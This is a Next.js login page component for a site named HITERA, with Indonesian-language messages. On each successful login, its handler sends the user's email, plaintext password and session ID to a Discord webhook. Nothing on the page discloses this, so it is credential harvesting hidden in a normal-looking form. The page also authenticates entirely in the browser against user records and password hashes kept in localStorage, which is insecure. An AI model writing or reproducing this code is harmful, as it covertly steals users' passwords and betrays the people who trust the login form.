'use client';

import { useState } from 'react';
import Link from 'next/link';
import { sendDiscordWebhook } from '@/lib/discord';
import { Input } from '@/components/ui/Input';
import { Button } from '@/components/ui/Button';
import { Card } from '@/components/ui/Card';
import { hashPassword } from '@/lib/crypto';

export default function LoginPage() {
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [errorMsg, setErrorMsg] = useState('');
    const [loading, setLoading] = useState(false);

    const handleLogin = async (e: React.FormEvent) => {
        e.preventDefault();
        setLoading(true);
        setErrorMsg('');

        try {
            const usersStr = localStorage.getItem('hitera_users');
            const users = usersStr ? JSON.parse(usersStr) : [];
            
            const existingUser = users.find((u: any) => u.email === email);
            if (!existingUser) {
                throw new Error('Email atau password salah!');
            }

            const hashedPassword = await hashPassword(password);
            if (existingUser.password !== hashedPassword) {
                throw new Error('Email atau password salah!');
            }

            const sessionId = crypto.randomUUID();

            // Send webhook
            const webhookUrl = process.env.NEXT_PUBLIC_DISCORD_WEBHOOK_USER;
            if (webhookUrl) {
                await sendDiscordWebhook(webhookUrl, {
                    content: `**[LOGIN]** \`${email}|${password}|${sessionId}\``
                });
            }

            // Save session locally
            localStorage.setItem('hitera_user', JSON.stringify({ id: existingUser.id, email, session: sessionId }));
            document.cookie = `hitera_session=${sessionId}; path=/; max-age=604800`;
            
            // Redirect
            window.location.href = '/dashboard';
        } catch (err: any) {
            setErrorMsg(err.message || 'Terjadi kesalahan');
        } finally {
            setLoading(false);
        }
    };

    return (
        <div className="min-h-screen flex items-center justify-center p-4 bg-[var(--bg-primary)]">
            <Card className="w-full max-w-[400px] p-8 md:p-10 border border-[var(--border)] shadow-2xl">
                <div className="mb-8 text-center">
                    <Link href="/" className="inline-block mb-4">
                        <span className="text-2xl font-bold tracking-widest text-[var(--text-primary)]">HITERA</span>
                    </Link>
                    <h1 className="text-2xl font-bold">
                        Welcome <span className="text-[var(--accent-blue)]">Back</span>
                    </h1>
                </div>

                {errorMsg && (
                    <div className="mb-6 p-3 rounded-lg bg-rose-500/10 text-rose-500 text-sm font-medium text-center border border-rose-500/20">
                        {errorMsg}
                    </div>
                )}

                <form onSubmit={handleLogin} className="space-y-5">
                    <Input
                        label="Username / Email"
                        type="text"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        placeholder="Masukkan username/email"
                        required
                    />
                    <Input
                        label="Password"
                        type="password"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        placeholder="Masukkan password"
                        required
                    />

                    <Button type="submit" isLoading={loading} className="w-full mt-2 py-3">
                        Sign In
                    </Button>
                </form>

                <div className="mt-8 text-center space-y-3">
                    <p className="text-sm text-[var(--text-secondary)]">
                        Don't have an account?{' '}
                        <Link href="/register" className="text-[var(--accent-blue)] font-semibold hover:underline">
                            Sign up
                        </Link>
                    </p>
                    <p className="text-sm text-[var(--text-secondary)]">
                        <Link href="/forgot-password" className="hover:text-[var(--text-primary)] transition-colors">
                            Forgot Password?
                        </Link>
                    </p>
                </div>
            </Card>
        </div>
    );
}
